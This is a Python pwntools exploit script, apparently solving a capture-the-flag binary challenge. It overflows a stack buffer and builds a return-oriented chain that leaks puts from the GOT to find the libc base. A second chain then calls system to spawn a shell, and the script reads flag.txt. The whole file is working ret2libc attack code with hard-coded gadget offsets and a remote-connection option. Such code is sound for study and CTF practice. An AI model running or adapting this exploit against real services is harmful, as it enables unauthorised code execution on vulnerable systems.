from pwn import *

elf = ELF('./task')
libc = ELF('./libc6_2.31-0ubuntu9.1_amd64.so')

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *ask+46",
		"c"
	]), env={'LD_PRELOAD': libc.path})
elif args.REMOTE:
	p = remote("localhost" if not args.ADDR else args.ADDR, 11312)
else:
	p = process(elf.path, env={'LD_PRELOAD': libc.path}) 

# https://libc.blukat.me/?q=puts%3A0x7fe30f40c5a0%2Csetvbuf%3A0x7fe30f40ce60&l=libc6_2.31-0ubuntu9.1_amd64

p.recvuntil(b"What is your favorite word? ")
payload = b'A' * (16 + 8)

# 0x00000000004012e3 : pop rdi ; ret
payload += p64(0x00000000004012e3)
payload += p64(elf.got['puts'])

# call puts to leak puts address from GOT
payload += p64(elf.symbols['puts'])

# run function again
payload += p64(elf.symbols['ask'])

p.sendline(payload)

p.recvline() # I don't like this word

leak_puts = p.recvline().strip().ljust(8, b'\x00')
leak_puts = u64(leak_puts)

print(f"puts leak: {hex(leak_puts)}")
libc_base = leak_puts - libc.symbols['puts']
libc.address = libc_base
print(f"libc base: {hex(libc_base)}")


# libc pop rdi
# 0x0000000000026b72 : pop rdi ; ret
payload = b'A' * (16 + 8)
payload += p64(libc_base + 0x0000000000026b72)
payload += p64(libc_base + 0x1b75aa)

# libc ret
# 0x0000000000025679 : ret
payload += p64(libc_base + 0x0000000000025679)

# call system
payload += p64(libc.symbols['system'])

p.sendline(payload)

sleep(1.0)
p.sendline(b'cat flag.txt')

print(p.clean(1.0))
